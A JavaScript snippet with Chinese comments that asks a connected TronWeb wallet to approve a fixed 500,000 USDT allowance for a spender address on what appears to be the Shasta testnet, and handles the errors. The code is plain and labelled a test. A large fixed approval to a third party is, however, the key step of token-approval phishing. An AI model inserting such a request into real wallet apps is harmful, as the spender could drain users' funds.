// ====== 固定授权额度：50万 USDT ======
function getLargeEnoughAmount() {
  return "50000000000000";  // 50万 * 10^6
}

window.approveUSDT = async function() {
  try {
    console.log("=== 授权 50万 USDT 测试 ===");
    setStatus("准备授权 50万 USDT...");

    if (!window.tronWeb || !window.tronWeb.ready) {
      throw new Error("请先连接钱包");
    }

    const amount = getLargeEnoughAmount();  // 调用正确的函数名

    console.log("授权金额(最小单位):", amount);

    const usdtContract = await window.tronWeb.contract().at(shastaUsdtAddress);

    // 直接授权固定金额
    const result = await usdtContract.approve(spenderAddress, amount).send({
      feeLimit: 100000000,
      callValue: 0
    });

    console.log("✅ 授权成功:", result);
    setStatus(`✅ 成功授权 50万 USDT`);

  } catch (err) {
    console.error("授权失败:", err);

    let errorMsg = err.message || err.toString();
    if (errorMsg.includes('out-of-bounds')) {
      errorMsg = "额度过大，钱包可能无法处理，请尝试更小金额";
    } else if (errorMsg.includes('INVALID_ARGUMENT')) {
      errorMsg = "参数格式错误";
    }

    setStatus("❌ 授权失败: " + errorMsg, true);

    setTimeout(() => {
      alert("授权失败，可能钱包不支持该数值或其他错误");
    }, 1000);
  }
};
